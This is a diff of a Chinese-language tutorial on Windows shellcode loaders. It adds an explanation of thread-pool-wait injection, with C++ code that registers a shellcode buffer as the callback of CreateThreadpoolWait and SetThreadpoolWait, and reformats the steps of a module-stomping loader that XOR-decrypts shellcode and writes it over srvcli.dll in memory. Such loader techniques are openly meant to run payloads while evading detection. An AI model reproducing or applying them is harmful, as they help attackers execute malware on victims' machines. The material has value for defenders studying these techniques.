@@ -1028,6 +1028,34 @@ int main(int argc, char* argv[])
 
 # 12.线程池等待
 
+## 实现思路
+
+利用线程池实现shellcode注入，主要依赖到两个Windows API，分别是`CreateThreadpoolWait`和`SetThreadpoolWait`函数
+
+`CreateThreadpoolWait`用于创建一个线程池，线程池等待内核对象变为有信号状态时，会执行特定的回调函数，其函数原型如下所示：
+
+```cpp
+PTP_WAIT CreateThreadpoolWait(
+      PTP_WAIT_CALLBACK pfnwa,  //指向回调函数的指针
+      PVOID              pv,   //传递给回调函数的参数
+      PTP_CALLBACK_ENVIRON pcbe  //指向线程池回调环境的指针,置NULL则表示使用默认的环境
+    );
+```
+
+`SetThreadpoolWait`函数用于在线程池中添加等待对象。当等待的内核对象（如事件、信号量等）变为有信号状态时，线程池会调用与等待对象关联的回调函数，其函数原型如下所示:
+
+```cpp
+VOID SetThreadpoolWait(
+      PTP_WAIT pwa,  //指向要添加到线程池的等待对象的指针
+      HANDLE   hObject,  //要等待的内核对象的句柄,当这个内核对象变为有信号状态时,线程池会调用与等待对象关联的回调函数
+      PFILETIME pftTimeout  //指向一个FILETIME结构的指针，表示等待超时的时间
+);
+```
+
+
+
+## 代码实现
+
 ```cpp
 #include <stdio.h>
 #include <Windows.h>
@@ -1044,30 +1072,9 @@ void ThreadPoolLoader() {
     // 创建一个事件对象，初始状态为有信号状态，使用默认安全属性，非手动重置，无名称
     HANDLE event = CreateEvent(NULL, FALSE, TRUE, NULL);
 
-    /*
-    CreateThreadpoolWait用于创建一个线程池等待对象的函数,
-    程池等待对象允许您在等待内核对象（如事件、信号量等）变为有信号状态时执行特定的回调函数
-    其语法格式如下:
-    PTP_WAIT CreateThreadpoolWait(
-      PTP_WAIT_CALLBACK pfnwa,  //指向回调函数的指针
-      PVOID              pv,   //传递给回调函数的参数
-      PTP_CALLBACK_ENVIRON pcbe  //指向线程池回调环境的指针,置NULL则表示使用默认的环境
-    );
-    */
     // 创建一个线程池等待对象，关联到shellcode作为回调函数，回调函数参数和线程池环境为NULL
     PTP_WAIT threadPoolWait = CreateThreadpoolWait((PTP_WAIT_CALLBACK)(LPVOID)shellcode, NULL, NULL);
-
-
-    /*
-    SetThreadpoolWait函数用于线程池中添加等待对象的函数。
-    当等待的内核对象（如事件、信号量等）变为有信号状态时，线程池会调用与等待对象关联的回调函数
-    其语法格式如下:
-    VOID SetThreadpoolWait(
-      PTP_WAIT pwa,  //指向要添加到线程池的等待对象的指针
-      HANDLE   hObject,  //要等待的内核对象的句柄,当这个内核对象变为有信号状态时,线程池会调用与等待对象关联的回调函数
-      PFILETIME pftTimeout  //指向一个FILETIME结构的指针，表示等待超时的时间
-    );
-    */
+   
     // 将等待对象添加到线程池中,当事件对象event触发（变为有信号状态）时，线程池会调用与threadPoolWait关联的回调函数
     SetThreadpoolWait(threadPoolWait, event, NULL);
 
@@ -1608,8 +1615,8 @@ int main(int argc, wchar_t* argv[])
 
 ## 实现思路
 
-1. 在内存中加载srvcli.dll模块，并找到这个模块在内存中的地址。
-2. 定义了一个包含加密后shellcode的数组（encryptedShellcode）和一个密钥（key）。此shellcode是以异或加密的形式给出的。
+1. 在内存中加载`srvcli.dll`模块，并找到这个模块在内存中的地址。
+2. 定义了一个包含加密后shellcode的数组（`encryptedShellcode`）和一个密钥（`key`）。此shellcode是以异或加密的形式给出的。
 3. 创建一个新的数组（shellcode），用于存储解密后的shellcode。使用给定的密钥对加密的shellcode进行解密。
 4. 调用`NtProtectVirtualMemory`函数改变选定内存区域的保护属性，将其改为可读写。
 5. 使用`RtlMoveMemory`函数将解密后的shellcode复制到目标模块（srvcli.dll）在内存中的地址。
@@ -1754,12 +1761,3 @@ int main(int argc, char** argv) {
 	return 0;
 }
 ```
-
-
-
-
-
-
-
-
-
